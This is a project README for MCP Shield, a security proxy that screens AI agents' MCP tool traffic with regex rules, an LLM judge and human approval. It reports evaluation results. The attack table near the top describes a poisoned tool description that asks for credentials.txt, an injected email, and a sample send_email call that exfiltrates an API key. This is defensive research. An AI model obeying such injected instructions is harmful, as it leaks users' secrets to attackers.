# MCP Shield

MCP Shield is a security proxy for AI agents that use MCP tools. It sits between the agent and its MCP servers. Every tool description, every set of arguments and every tool result passes through it. For each one it decides to allow it, block it, clean it, or ask a person.

![Live flow page of the dashboard](docs/live-flow.png)

## Why I built this

An agent with tools reads a lot of text it did not write: tool descriptions, emails, files, web pages. An attacker can put instructions in that text. I looked at three kinds of attack:

| Attack | Where it hides | Example in this repo |
|---|---|---|
| Tool poisoning | The tool description | A calculator tool whose description tells the model to read `credentials.txt` and pass it in a hidden parameter |
| Indirect prompt injection | Data returned by a tool | An email that tells the agent to send the credentials file to an outside address |
| Data exfiltration | Arguments the agent sends | `send_email(to="audit-team@external-review.com", body="API_KEY=sk-...")` |

Both attacks work against an unprotected agent running `gpt-oss-20b`. The fake API key ends up with the attacker. With MCP Shield in front of the servers, it does not.

## How it works

```mermaid
flowchart LR
    U[User] --> A["Agent<br/>LangGraph, gpt-oss-20b"]
    A -- MCP over stdio --> P
    subgraph P [MCP Shield proxy]
        direction LR
        S[Regex scan] --> J[LLM judge] --> D[Policy] --> X[Sanitize or ask a human]
    end
    P -- MCP over stdio --> T1[files server]
    P --> T2[email server]
    P --> T3[notes server]
    P -.-> DB[(SQLite: audit log and trace)]
    DB --> W[Dashboard]
```

The proxy acts as an MCP server toward the agent and as an MCP client toward the real servers. Because of this, any MCP client can use it without changes.

It checks three points:

1. Tool descriptions, when the tools are listed. A poisoned tool is hidden from the agent.
2. Arguments, before a call is forwarded. Secrets are redacted.
3. Results, before they reach the model. Injected instructions are removed.

Each item goes through a LangGraph workflow:

```mermaid
flowchart TD
    I((item)) --> K{type}
    K --> SD[scan description] & SA[scan arguments] & SR[scan result]
    SD & SA & SR --> R{regex score}
    R -- "high" --> B[block]
    R -- "low" --> AL[allow]
    R -- "in between" --> JU[LLM judge]
    B & AL & JU --> DE[apply policy.yaml]
    DE -- sanitize --> SN[sanitize]
    DE -- ask human --> H["pause with interrupt()"]
    SN -- nothing to remove --> H
    DE -- allow or block --> E((done))
    SN --> E
    H --> E
```

The parts of the workflow:

- **Regex scan.** Weighted rules give each item a score in well under a millisecond. Obvious attacks are blocked at this step without calling an LLM.
- **LLM judge.** Items that are not obvious go to an LLM. The prompt includes the closest known attack patterns, found by a small retriever. The judge returns a Pydantic object with `is_attack`, `confidence` and `reason`. Groq `gpt-oss-20b` is tried first because it is the fastest. If Groq is rate limited, the judge falls back to Gemini.
- **Policy.** `shield/policy.yaml` sets the score thresholds, the trusted email domains, the action for each kind of item and the approval timeout.
- **Sanitize.** Secrets in arguments are replaced with `[REDACTED]`. Sentences in results that look like instructions to the agent are removed.
- **Human approval.** The graph pauses with LangGraph `interrupt()`. Its state is saved in a SQLite checkpointer, and it continues when someone approves or denies in the dashboard. If nobody answers before the timeout, the request is denied.
- **Logging.** Every decision is stored in SQLite. Every step of every request is also stored as a trace, which the dashboard shows live.

## Results

I tested on two labelled sets:

- **Main set:** 200 cases, 110 attacks and 90 benign. The attacks are split into easy and hard. Hard means paraphrased, written in other languages, or encoded. Some benign cases are written to look like attacks.
- **Holdout set:** 32 cases written after all tuning was done. I used it only to check the final numbers.

| Setup | Main: detected | Main: false positives | Holdout: detected | Holdout: false positives | Median time per check |
|---|---|---|---|---|---|
| No protection | 0% | 0% | 0% | 0% | - |
| Regex only | 26.4% | 0.0% | 0.0% | 0.0% | 0.02 ms |
| Judge only for uncertain items (`low: 0.2`) | 48.2% | 1.1% | 6.7% | 5.9% | 4 ms |
| Extra keyword rules (not kept) | 95.5% | 2.2% | 6.7% | 5.9% | - |
| Judge for everything except obvious attacks (`low: 0.0`) | 98.2% | 4.4% | 93.3% | 0% to 5.9% | about 2 s |

Notes on the last row:

- On the main set, 108 of the 110 attacks were confirmed as caught. The other two were flagged only because the judge call failed and the system fails closed.
- On the holdout set, the false positive rate depends on the judge model. It was 0% with Gemini 3.1 Flash Lite and 5.9% with Groq `gpt-oss-20b`.
- These sets are small. One case changes a holdout rate by about 3 percentage points.

### What I learned from testing

- With the first thresholds, 56 of the 73 hard attacks got a regex score of zero. They never reached the judge. The judge caught every hard attack that did reach it, so the weak point was the routing, not the judge.
- Adding keyword rules raised the main set result from 48% to 95%. On the holdout set the same version scored 6.7%, the same as before. The rules had matched my own wording, not attacks in general, so I removed them. Sending every non-obvious item to the judge gave 93% on the holdout set.
- One early test run had 18 failed judge calls, caused by a structured output problem on Groq. They were counted as detections, which made the results wrong. The test runner now counts judge failures separately and prints a warning.
- The regex step takes microseconds. The judge adds about 1 to 2 seconds per check. The `low` setting in the policy file controls this trade-off.

## Running it

You need Python 3.11 or newer and [uv](https://docs.astral.sh/uv/).

```bash
uv sync
cp .env.example .env
```

Add `GROQ_API_KEY` to `.env`. `GOOGLE_API_KEY` is optional and is used as a fallback for the agent and the judge.

```bash
uv run pytest
```

There are 67 tests. They run offline and never call an LLM.

Start the dashboard:

```bash
uv run python dashboard/server.py
```

Then open http://127.0.0.1:8000.

Run the attacks from the command line:

```bash
uv run python demo_attack.py
uv run python demo_attack.py --shield
```

Run the evaluation:

```bash
uv run python -u evals/run_eval.py
uv run python -u evals/run_eval.py --dataset holdout
uv run python evals/run_eval.py --fast
```

The first two commands call the judge API. The `--fast` option uses only the regex rules, so it is free and finishes in about a second.

To put MCP Shield in front of servers used by another MCP client, start the proxy in their place. For example, with Claude Code:

```bash
claude mcp add shield -- uv run --directory /path/to/mcp_gateway python shield/proxy.py servers/files_server.py servers/email_server.py
```

## Dashboard

| Page | Contents |
|---|---|
| Live flow | Three scenarios (a normal request, tool poisoning, prompt injection) that you can run with or without the shield. A diagram shows which stage the request is at, and a timeline lists each step with its timing. Approval requests show up on this page too. |
| Overview | Totals by action and by type of item, and the time taken by the regex step and the judge |
| Audit log | Every decision with its reason, with filters |
| Approvals | Pending approval requests with a countdown, and past decisions |
| Playground | Paste any text and see the verdict and what would be forwarded |
| Evaluation | Detection and false positive rates by setup, attack type and difficulty |

The backend uses FastAPI. The frontend is plain HTML, CSS and JavaScript without a framework or a build step.

## Project structure

```
shield/
  proxy.py       the MCP proxy: inspects, enforces, writes the audit log and trace
  graph.py       LangGraph inspection workflow
  detectors.py   regex rules for descriptions, arguments and results
  judge.py       LLM judge with retriever and structured output
  sanitize.py    removes secrets and injected sentences
  policy.py      reads policy.yaml and maps a verdict to an action
  audit.py       SQLite storage for the audit log, approvals and trace
servers/         three normal MCP servers and two attack servers
agent.py         the test agent: LangGraph with Groq, tools loaded over MCP
mcp_tools.py     converts MCP tools into LangChain tools
dashboard/       FastAPI server and static frontend
evals/           datasets and the evaluation runner
tests/           pytest tests
docs/            demo script and screenshot
demo_attack.py   command line attack demo
approve.py       command line approval tool
app.py           simple Streamlit chat with the agent
```

## Limitations

- The judge can also be attacked, because the text it checks is part of its prompt. The prompt marks that text as data, the judge has no tools, and its output must match a schema. This reduces the risk but does not remove it.
- Sanitizing only removes what the rules recognise. If the judge flags something and nothing can be removed, the request waits for a person.
- Each check by the judge takes 1 to 2 seconds. If the judge API is slow or down, the shield is slow too, and it denies by default.
- The datasets are small and were written by one person. They are not a benchmark.
- Free tier API limits are low. A full evaluation needs about 200 judge calls.
- Only MCP tools are proxied. Resources and prompts are not. Tool names must be unique across servers.
- The audit log stores tool traffic as plain text, including anything that was not redacted.

## Built with

Python 3.12, MCP Python SDK 2.x, LangGraph, LangChain, Groq (`gpt-oss-20b`), Google Gemini, SQLite, FastAPI and pytest.

## Author

Vaibhav
